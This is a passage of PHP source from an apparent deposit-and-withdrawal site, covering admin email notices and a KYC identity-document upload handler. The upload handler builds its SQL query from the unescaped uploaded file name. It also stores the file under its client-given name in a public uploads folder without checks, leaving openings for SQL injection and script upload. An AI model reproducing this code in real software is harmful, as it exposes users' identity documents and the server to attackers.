                    <h5 style="color: green; text-align: center;">WITHDRAWAL DETAILS:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx_id . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Amount:</b> $' . $amt . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Bank:</b> ' . $bank . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Pending</b></p>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/deposit.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">Approve Here</a>
                </center>
                <br>
            </div>';
        send_email(Admin_Email, "Withdraw Request", $admin_message);

        redirect_with_message('withdraw.php', 'success', 'Withdrawal successful!');
    } else {
        redirect_with_message('withdraw.php', 'status', 'An error occured, please contact the management');
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - Verification
// ============================================

/**
 * Handle KYC verification file upload
 */
function handle_kyc_upload() {
    global $conn;
    
    $card = $_FILES['kyc_file']['name'];
    $user = acct_id;

    $sql = "UPDATE user SET card = '$card', card_stat = 2 WHERE acct_id = '$user'";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        // Send admin notification
        $message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <center>
                    <img src="https://' . DOMAIN . '/uploads/' . LOGO . '" width="100%" height="30%" alt="LOGO">
                </center><br>
                <p>' . fname . ' ' . lname . ' just submitted KYC.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
                    <h5 style="color: green; text-align: center;">KYC DETAILS:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <b style="color: white; font-size: 17px;">ID Card</b>
                    <a href="https://' . DOMAIN . '/uploads/' . $card . '" target="_blank">
                        <img src="https://' . DOMAIN . '/uploads/' . $card . '" class="rounded mx-auto d-block" width=720 height=100%>
                    </a>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/user_edit.php?id=' . id . '" style="background-color: rgb(216, 0, 0); color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">Login Here</a>
                </center>
                <br>
            </div>
        ';
        send_email(Admin_Email, "KYC Verification Pending", $message);

        move_uploaded_file($_FILES['kyc_file']['tmp_name'], '../uploads/' . $_FILES['kyc_file']['name']);
        redirect_with_message('kyc.php', 'success', 'KYC updated successfully!');
    } else {
        redirect_with_message('kyc.php', 'status', 'KYC Update Unsuccessful');
    }
}

// ============================================
// EXECUTION
// ============================================

process_form();

?>